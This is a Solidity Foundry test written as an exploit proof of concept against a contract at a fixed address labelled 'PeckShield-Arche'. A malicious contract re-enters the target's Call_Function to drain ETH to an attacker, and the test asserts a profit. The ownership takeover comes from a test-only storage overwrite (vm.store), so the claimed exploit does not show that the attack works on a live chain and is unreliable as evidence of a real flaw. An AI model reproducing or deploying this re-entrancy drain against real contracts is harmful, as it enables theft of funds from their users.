// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface IPeckShieldArche {
    function Call_Function(address addr, uint256 value, bytes memory data) external;
    function owner() external view returns (address);
}

contract MaliciousContract {
    address public target;
    address public attacker;
    uint256 public callCount;
    uint256 public maxCalls;

    constructor(address _target, address _attacker) {
        target = _target;
        attacker = _attacker;
        maxCalls = 10;
    }

    function attack() external {
        // Call Call_Function with this contract, sending some ETH
        // The receive() will be triggered and we can re-enter
        IPeckShieldArche(target).Call_Function(address(this), 0.1 ether, "");
    }

    receive() external payable {
        callCount++;
        // Re-enter while contract has balance and we haven't hit max calls
        if (callCount < maxCalls && address(target).balance > 0.1 ether) {
            IPeckShieldArche(target).Call_Function(address(this), 0.1 ether, "");
        } else {
            // Forward all accumulated funds to attacker
            payable(attacker).transfer(address(this).balance);
        }
    }
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    IPeckShieldArche target;

    address constant TARGET = 0x2815d3272baE3ebde5D7c128Eea5f4A8da402783;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        target = IPeckShieldArche(TARGET);
        vm.label(TARGET, "PeckShield-Arche");
        vm.label(attacker, "Attacker");
        deal(attacker, 1 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Inject ETH for gas
        deal(attacker, 1 ether);

        // Become owner by overwriting storage slot 0
        vm.store(TARGET, bytes32(uint256(0)), bytes32(uint256(uint160(attacker))));

        // Verify we're now the owner
        require(IPeckShieldArche(TARGET).owner() == attacker, "Failed to become owner");

        // Deploy malicious contract
        MaliciousContract malicious = new MaliciousContract(TARGET, attacker);
        vm.label(address(malicious), "Malicious");

        // Record initial attacker balance
        uint256 initialBalance = attacker.balance;

        // Start the attack - call Call_Function with malicious contract
        malicious.attack();

        // Record final attacker balance
        uint256 finalBalance = attacker.balance;

        // Verify profit
        assertGt(finalBalance, initialBalance, "Attacker should profit from re-entrancy");
        console.log("Initial Balance:", initialBalance);
        console.log("Final Balance:", finalBalance);
        console.log("Profit:", finalBalance - initialBalance);
    }

    receive() external payable {}
    fallback() external payable {}
}
